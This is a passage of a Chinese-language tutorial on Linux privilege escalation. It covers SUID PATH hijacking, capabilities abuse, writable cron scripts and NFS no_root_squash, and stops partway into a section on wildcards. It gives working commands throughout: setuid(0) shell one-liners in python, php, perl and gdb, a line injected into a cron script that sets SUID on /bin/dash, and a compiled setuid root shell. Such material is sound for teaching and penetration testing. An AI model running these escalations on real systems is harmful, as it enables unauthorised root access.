<span class="line"><span>whoami</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过echo法进行提权，而shell2因为缺少uid的设置无法提权(仅当前测试环境)，除了使用echo方法，还有</p><p>cp法</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /home/uu2fu3o/script/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /bin/sh</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /tmp/ps</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $PATH</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$PATH</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">./shell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">whoami</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>软连接法</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /bin/sh</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ps</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$PATH</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">./shell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">id</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">whoami</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意如果目录具有完全权限，它将成功工作。在 Ubuntu 中，我们在软链接的情况下授予了 /script 目录 777 的权限</p><p>该方法的利用其实也是suid，利用具有suid权限的脚本，自定义当前用户的环境变量来达到提权的目的</p><h4 id="capabilities提权" tabindex="-1"><a class="header-anchor" href="#capabilities提权"><span>Capabilities提权</span></a></h4><p>Linux 2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的，在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题</p><p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html%E4%B8%AD%E6%9C%89%E5%AF%B9%E6%9D%83%E9%99%90%E5%88%86%E7%B1%BB%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D" target="_blank" rel="noopener noreferrer">https://man7.org/linux/man-pages/man7/capabilities.7.html中有对权限分类的详细介绍</a></p><p>关于机制：在进行特权操作时，如果euid不是root,就会检查进程是否有对应的capabilities，并根据结果是否执行对应的操作，</p><p>capabilities细分到线程，每个线程可以有不同的capabilities，除了对线程的capabilities有相关功能外，还对具有对文件的附加属性进行设置，使得文件具有一定的capabilities，但是需要注意的是</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>文件cap_setuid的capabilities和文件的suid标志位之间是没有关系的：</span></span>
<span class="line"><span>设置了cap_setuid的capability的文件并没有设置suid。</span></span>
<span class="line"><span>设置了suid的程序也不拥有cap_setuid的capability。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>关于详细的介绍和理解可以看这篇文章<a href="https://www.cnblogs.com/f-carey/p/16026088.html#tid-5fzNyS%E3%80%82%E8%BF%99%E9%87%8C%E4%BB%85%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%AF%A5%E5%B1%9E%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/f-carey/p/16026088.html#tid-5fzNyS。这里仅介绍一些基本命令以及如何使用该属性进行提权</a></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>getcap /bin/ping #获取ping命令的capabilities</span></span>
<span class="line"><span>setcap cap_net_raw,cap_net_admin=eip /bin/ping  #添加capabilities</span></span>
<span class="line"><span>setcap -r /bin/ping #删除文件的capabilities</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>利用capabilities实现权限提升</strong></p><p>查找设置了capabilities的可执行文件</p><div class="language-sehll line-numbers-mode" data-highlighter="shiki" data-ext="sehll" data-title="sehll" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>getcap -r / 2&gt;/dev/null</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#python</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">python</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">php</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;posix_setuid(0); system(&#39;/bin/sh&#39;);&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#perl</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">perl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#gdb</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gdb</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -nx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ex</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;python import os; os.setuid(0)&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ex</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;!sh&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ex</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> quit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>更多的命令可以在<a href="https://gtfobins.github.io/%E8%87%AA%E8%A1%8C%E5%AF%BB%E6%89%BE" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/自行寻找</a></p><h4 id="定时任务提权" tabindex="-1"><a class="header-anchor" href="#定时任务提权"><span>定时任务提权</span></a></h4><p>定时任务通常被设置用于备份文件、清理目录内容等。crontab命令可以创建一个cron文件，以指定的时间区间运行。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p><p>假设我们已经进入目标机器，并尝试定时任务提权(仅演示ubuntu)</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cat /etc/crontab</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>寻找可以利用的脚本，该脚本需要可读可写可更改</p><p>更改脚本内容来实现提权，例如将下述代码插入到python脚本中，等待执行该脚本后执行/bin/dash提权</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>os.system(&#39;chmod u+s /bin/dash&#39;)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>如果目标机器的CronJob存在，但文件已被删除，并且未定义脚本的完整路径，cron 将引用 /etc/crontab 文件中 PATH 变量下列出的路径。可以被当前用户利用。</p><p>**问1：**ubuntu和centos的定时任务有什么区别</p><p>Ubuntu和CentOS都支持使用cron定时任务来自动执行指定的命令或脚本。它们在默认设置和配置方面存在一些区别。</p><ol><li>工具名称和路径：在Ubuntu中，cron守护程序的名称是cron，而在CentOS中，它是crond。此外，在Ubuntu中，cron配置文件的路径是/etc/crontab和/etc/cron.d/，而在CentOS中，cron配置文件的路径是/etc/crontab和/etc/cron.d/，但是crontab文件的路径是/var/spool/cron/。</li><li>默认配置：在Ubuntu中，cron守护程序默认启用了用户级别的crontab文件（通过crontab -e命令创建），而在CentOS中，默认情况下只启用了系统级别的crontab文件（通过在/etc/crontab和/etc/cron.d/目录中创建文件来添加任务）。</li><li>用户限制：在Ubuntu和CentOS中，系统管理员可以通过配置/etc/cron.allow和/etc/cron.deny文件来限制哪些用户可以使用cron。Ubuntu默认情况下启用了cron.allow文件，而CentOS默认情况下启用了cron.deny文件。</li><li>日志文件：在Ubuntu和CentOS中，cron守护程序的日志文件路径都是/var/log/cron.log。但是，在CentOS中，默认情况下cron日志并不会记录到日志文件中，需要手动配置日志记录功能。</li></ol><p>**问2：**centos的定时任务文件树是怎样的</p><p>CentOS 的定时任务文件树通常位于 /etc/cron.d/ 和 /var/spool/cron/目录下。</p><ol><li>/etc/cron.d/：在这个目录下，系统管理员可以创建任意数量的 cron 文件，每个文件都包含多个 cron 任务。文件名可以是任意的，但通常使用描述性的名称（如 apache、mysql 等）以便于管理。每个文件的格式与 /etc/crontab文件相同，它们由五个时间字段和一个要执行的命令组成。</li><li>/var/spool/cron/：在这个目录下，用户可以创建他们自己的 cron 任务。每个用户都有一个以其用户名命名的文件，其中包含该用户的 cron 任务。用户可通过运行 crontab -e命令来编辑其 cron 文件。每个文件的格式与etc/crontab文件相同，它们由五个时间字段和一个要执行的命令组成。</li></ol><h4 id="nfs提权" tabindex="-1"><a class="header-anchor" href="#nfs提权"><span>NFS提权</span></a></h4><p><strong>什么是NFS</strong></p><p>网络文件系统（<strong>NFS</strong>）是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在 <strong>NFS</strong> 协议是几个分布式文件系统标准，网络附加存储（NAS）之一。</p><p>NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了<a href="https://cloud.tencent.com/solution/xdr?from_column=20420&amp;from=20420" target="_blank" rel="noopener noreferrer">XDR</a>的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p><p><strong>利用条件</strong></p><p>no_root_squash选项开启</p><p><strong>no_root_squash和root_squash的区别</strong></p><p>root_squash表示将 root 用户的权限限制为普通用户，即将 root 用户的操作权限降低到与普通用户相同的级别。这个选项会将 NFS 客户端上的 root 用户的操作权限映射为匿名用户或者指定的非特权用户;而no_root_squash正好相反，NFS客户端上的root用户拥有完整的root权限</p><p><strong>利用nfs</strong></p><p>1.识别nfs共享，可通过nmap或rpcinfo等工具</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>nmap -sV -p 111,2049 IP</span></span>
<span class="line"><span>#nmap扫描nfs的常用端口111和2049</span></span>
<span class="line"><span>rpcinfo -p IP</span></span>
<span class="line"><span>#rpcinfo直接枚举nfs</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2.检查开启的nsf共享目录和<code>no_root_squash</code>选项设置</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cat /etc/exports</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>该文件每一行都由如下格式构成</p><p>[共享的目录] [主机名或IP(参数,参数)]</p><p>也可以是用showmount进行查看</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">showmount命令用于查询NFS服务器的相关信息</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># showmount --help</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> Usage:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> showmount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [-adehv]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        [--all] [--directories] [--exports]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        [--no-headers] [--help] [--version] [host]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">-a或--all</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    以</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> host:dir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 这样的格式来显示客户主机名和挂载点目录。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> -d或--directories</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    仅显示被客户挂载的目录名。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> -e或--exports</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    显示NFS服务器的输出清单。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> -h或--help</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    显示帮助信息。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> -v或--version</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    显示版本信。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> --no-headers</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    禁止输出描述头部信息。</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">显示NFS客户端信息</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # showmount</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">显示指定NFS服务器连接NFS客户端的信息</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # showmount ip  #此ip为nfs服务器的</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">显示输出目录列表</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # showmount -e</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">显示指定NFS服务器输出目录列表（也称为共享目录列表）</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # showmount -e ip</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">显示被挂载的共享目录</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # showmount -d</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">显示客户端信息和共享目录</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # showmount -a</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">显示指定NFS服务器的客户端信息和共享目录</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># showmount -a ip</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用msf同样</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>msf &gt; use auxiliary/scanner/nfs/nfsmount</span></span>
<span class="line"><span>msf auxiliary(nfsmount) &gt; set rhosts IP</span></span>
<span class="line"><span>msf auxiliary(nfsmount) &gt; run</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>/cat/exports中存在以下内容</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>└─# cat /etc/exports                                              </span></span>
<span class="line"><span>/tmp *(rw,sync,no_root_squash,no_subtree_check)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>说明tmp目录存在我们需要的参数，并且能够远程挂载</p><p>3.创建目录远程挂载系统</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mkdir /tmp/test</span></span>
<span class="line"><span>mount -o rw，vers = 2 [目标ip]：/tmp /tmp/test</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>在/tmp/test中创建C文件</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" data-title="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;unistd.h&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        setuid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        setgid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/bin/bash&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>编译</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>gcc /tmp/test/suid-shell.c -o suid-shell</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>赋权</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>chmod +s suid-shell</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>回到目标机器上执行编译后的脚本,即可获得root权限，也可以利用其它类型的脚本，例如python,取决与目标机器上有什么服务</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">bin</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">python3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> os</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">try</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        os.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/bin/bash&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">except</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="通配符提权" tabindex="-1"><a class="header-anchor" href="#通配符提权"><span>通配符提权</span></a></h4><h5 id="常见的通配符介绍" tabindex="-1"><a class="header-anchor" href="#常见的通配符介绍"><span>常见的通配符介绍</span></a></h5><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>*  代表任意多个字符</span></span>
<span class="line"><span>?  代表任意单个字符</span></span>
